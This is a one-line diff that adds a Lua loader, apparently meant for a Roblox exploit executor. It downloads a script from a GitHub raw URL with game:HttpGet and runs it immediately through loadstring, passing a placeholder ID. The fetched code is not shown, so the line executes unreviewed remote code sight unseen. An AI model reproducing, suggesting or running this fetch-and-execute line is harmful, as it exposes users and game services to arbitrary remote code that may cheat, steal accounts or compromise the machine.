@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DannyH3103/scripts/main/controlc"))()("CONTROLC_ID")
